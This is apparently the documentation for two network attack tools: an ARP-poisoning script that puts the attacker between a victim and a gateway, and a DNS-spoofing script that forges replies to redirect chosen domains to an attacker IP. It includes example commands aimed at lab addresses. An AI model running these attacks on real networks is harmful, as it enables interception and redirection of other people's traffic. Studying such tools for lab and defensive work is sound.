# dns_spoof.py — Quick Reference

Intercepts DNS **UDP/53** queries on the configured network interface and, for matched domain patterns, forges DNS **A** replies that map the queried name to `attacker_ip` while pretending to come from `dns_server`. Runs a background sniffer thread and sends multiple crafted Ethernet/IP/UDP/DNS packets to the client.

## Usage

```bash
sudo python3 dns_spoof.py -v <victim_ip> -c <config.json> -d <dns_server_ip> -t <attacker_ip> -I <iface> [-V]
```

### Example

```bash
sudo python3 dns_spoof.py \
  -v 192.168.200.129 \
  -c ./dns_spoof_config.json \
  -d 192.168.200.131 \
  -t 192.168.200.128 \
  -I eth0 -V
```

## CLI options

* `-v, --victim` **(required)** — Victim/client IP to observe (e.g. `192.168.200.129`).
* `-c, --config` — Path to JSON config (default `dns_spoof_config.json`).
* `-d, --dns-server` — IP of DNS server to impersonate (default in script: `192.168.200.131`).
* `-t, --attacker` — IP to return in forged A records (default: `192.168.200.128`).
* `-I, --iface` — Network interface to send/receive packets on (default: `eth0`).
* `-V, --verbose` — Print detailed send/log lines.

## Config file (JSON) 

```json
{
  "mode": "blacklist",        // "blacklist" or "whitelist"
  "domains": ["example.com"], // domain patterns (supports simple patterns)
  "forward_non_target": false 
}
```

* `mode = "blacklist"`: spoof every query **except** those matching `domains`.
* `mode = "whitelist"`: spoof **only** queries that match `domains`.


# arp_spoof.py — Quick Reference

## What it does

Performs ARP poisoning (ARP spoofing) between a victim and the gateway: the attacker repeatedly sends spoofed ARP replies to both victim and gateway to associate the attacker's MAC with the other's IP, enabling a Man-in-the-Middle position. Optionally enables IP forwarding on the attacker to forward packets between victim and gateway.

## Usage

```bash
sudo python3 arp_spoof.py -i <iface> -v <victim_ip> -g <gateway_ip> [--enable-forward] [-n <interval>] [-V]
```

### Example

```bash
sudo python3 arp_spoof.py \
  -i eth0 \
  -v 192.168.200.129 \
  -g 192.168.200.131 \
  --enable-forward \
  -n 2 -V
```

## CLI options

* `-v, --victim` **(required)** — Victim IP to target (e.g. `192.168.200.129`).
* `-g, --gateway` **(required)** — Gateway IP to poison (e.g. `192.168.200.131`).
* `-i, --iface` **(required)** — Network interface to use (e.g. `eth0`).
* `--victim-mac` — Victim MAC address (optional). If omitted, script will resolve it via ARP.
* `--gateway-mac` — Gateway MAC address (optional). If omitted, script will resolve it via ARP.
* `--enable-forward` — Enable Linux IP forwarding on the attacker so intercepted packets are routed.
* `-n, --interval` — Poisoning interval in seconds (default `2.0`).
* `-V, --verbose` — Verbose output (prints resolved MACs and status).

